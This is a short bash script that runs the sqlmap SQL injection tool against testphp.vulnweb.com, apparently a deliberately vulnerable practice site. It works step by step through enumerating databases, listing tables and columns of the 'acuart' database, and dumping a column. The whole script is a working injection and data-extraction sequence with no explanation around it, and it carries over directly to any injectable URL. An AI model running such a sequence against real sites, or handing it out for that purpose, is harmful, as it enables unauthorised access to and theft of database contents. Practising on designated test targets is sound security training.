#!/bin/bash
#sudo apt-get install sqlmap
sqlmap -h
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 --dbs
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists --columns
sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -C aname --dump 